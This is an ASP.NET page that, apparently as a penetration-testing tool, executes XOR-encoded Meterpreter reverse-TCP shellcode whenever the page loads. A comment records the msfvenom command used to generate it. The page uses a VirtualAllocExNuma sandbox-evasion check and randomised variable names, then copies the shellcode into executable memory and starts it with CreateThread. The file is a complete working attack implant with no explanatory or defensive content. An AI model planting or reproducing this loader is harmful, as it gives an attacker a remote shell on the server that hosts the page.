<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }

        <%-- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f aspx -t 300 -e x64/xor_dynamic --%>
        byte[] s7pvW2Gj = new byte[560] {0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x5d,0xfc,0xae,0x75,0xfd,0x57,0x59,
        0x53,0x5e,0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xe8,0x14,0x74,0x07,0x80,
        0x3e,0x5d,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,0xff,0x13,0x5d,0xef,0x5b,0x90,0xf7,0xe3,
        0xfb,0xdf,0x13,0x13,0x13,0x52,0x42,0x52,0x43,0x41,0x5b,0x22,0xc1,0x76,0x5b,0x98,0x41,0x73,0x42,0x45,
        0x5b,0x98,0x41,0x0b,0x5b,0x98,0x41,0x33,0x5b,0x98,0x61,0x43,0x5e,0x22,0xda,0x5b,0x1c,0xa4,0x59,0x59,
        0x5b,0x22,0xd3,0xbf,0x2f,0x72,0x6f,0x11,0x3f,0x33,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0xf1,0xfe,0x41,
        0x52,0x42,0x5b,0x98,0x41,0x33,0x98,0x51,0x2f,0x5b,0x12,0xc3,0x75,0x92,0x6b,0x0b,0x18,0x11,0x1c,0x96,
        0x61,0x13,0x13,0x13,0x98,0x93,0x9b,0x13,0x13,0x13,0x5b,0x96,0xd3,0x67,0x74,0x5b,0x12,0xc3,0x43,0x98,
        0x5b,0x0b,0x57,0x98,0x53,0x33,0x5a,0x12,0xc3,0xf0,0x45,0x5b,0xec,0xda,0x52,0x98,0x27,0x9b,0x5e,0x22,
        0xda,0x5b,0x12,0xc5,0x5b,0x22,0xd3,0x52,0xd2,0xda,0x1e,0xbf,0x52,0x12,0xd2,0x2b,0xf3,0x66,0xe2,0x5f,
        0x10,0x5f,0x37,0x1b,0x56,0x2a,0xc2,0x66,0xcb,0x4b,0x57,0x98,0x53,0x37,0x5a,0x12,0xc3,0x75,0x52,0x98,
        0x1f,0x5b,0x57,0x98,0x53,0x0f,0x5a,0x12,0xc3,0x52,0x98,0x17,0x9b,0x5b,0x12,0xc3,0x52,0x4b,0x52,0x4b,
        0x4d,0x4a,0x49,0x52,0x4b,0x52,0x4a,0x52,0x49,0x5b,0x90,0xff,0x33,0x52,0x41,0xec,0xf3,0x4b,0x52,0x4a,
        0x49,0x5b,0x98,0x01,0xfa,0x58,0xec,0xec,0xec,0x4e,0x5a,0xad,0x64,0x60,0x21,0x4c,0x20,0x21,0x13,0x13,
        0x52,0x45,0x5a,0x9a,0xf5,0x5b,0x92,0xff,0xb3,0x12,0x13,0x13,0x5a,0x9a,0xf6,0x5a,0xaf,0x11,0x13,0x12,
        0xa8,0xd3,0xbb,0x3e,0xd2,0x52,0x47,0x5a,0x9a,0xf7,0x5f,0x9a,0xe2,0x52,0xa9,0x5f,0x64,0x35,0x14,0xec,
        0xc6,0x5f,0x9a,0xf9,0x7b,0x12,0x12,0x13,0x13,0x4a,0x52,0xa9,0x3a,0x93,0x78,0x13,0xec,0xc6,0x79,0x19,
        0x52,0x4d,0x43,0x43,0x5e,0x22,0xda,0x5e,0x22,0xd3,0x5b,0xec,0xd3,0x5b,0x9a,0xd1,0x5b,0xec,0xd3,0x5b,
        0x9a,0xd2,0x52,0xa9,0xf9,0x1c,0xcc,0xf3,0xec,0xc6,0x5b,0x9a,0xd4,0x79,0x03,0x52,0x4b,0x5f,0x9a,0xf1,
        0x5b,0x9a,0xea,0x52,0xa9,0x8a,0xb6,0x67,0x72,0xec,0xc6,0x96,0xd3,0x67,0x19,0x5a,0xec,0xdd,0x66,0xf6,
        0xfb,0x80,0x13,0x13,0x13,0x5b,0x90,0xff,0x03,0x5b,0x9a,0xf1,0x5e,0x22,0xda,0x79,0x17,0x52,0x4b,0x5b,
        0x9a,0xea,0x52,0xa9,0x11,0xca,0xdb,0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6d,0x46,0x5b,0x90,0xd7,0x33,0x4d,
        0x9a,0xe5,0x79,0x53,0x52,0x4a,0x7b,0x13,0x03,0x13,0x13,0x52,0x4b,0x5b,0x9a,0xe1,0x5b,0x22,0xda,0x52,
        0xa9,0x4b,0xb7,0x40,0xf6,0xec,0xc6,0x5b,0x9a,0xd0,0x5a,0x9a,0xd4,0x5e,0x22,0xda,0x5a,0x9a,0xe3,0x5b,
        0x9a,0xc9,0x5b,0x9a,0xea,0x52,0xa9,0x11,0xca,0xdb,0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6e,0x3b,0x4b,0x52,
        0x44,0x4a,0x7b,0x13,0x53,0x13,0x13,0x52,0x4b,0x79,0x13,0x49,0x52,0xa9,0x18,0x3c,0x1c,0x23,0xec,0xc6,
        0x44,0x4a,0x52,0xa9,0x66,0x7d,0x5e,0x72,0xec,0xc6,0x5a,0xec,0xdd,0xfa,0x2f,0xec,0xec,0xec,0x5b,0x12,
        0xd0,0x5b,0x3a,0xd5,0x5b,0x96,0xe5,0x66,0xa7,0x52,0xec,0xf4,0x4b,0x79,0x13,0x4a,0x5a,0xd4,0xd1,0xe3,
        0xa6,0xb1,0x45,0xec,0xc6,0xe8,0x14};

        IntPtr oKr4H = VirtualAlloc(IntPtr.Zero,(UIntPtr)s7pvW2Gj.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(s7pvW2Gj,0,oKr4H,s7pvW2Gj.Length);
        IntPtr sAlzkE0 = IntPtr.Zero;
        IntPtr gyczWK = CreateThread(IntPtr.Zero,UIntPtr.Zero,oKr4H,IntPtr.Zero,0,ref sAlzkE0);
    }
</script>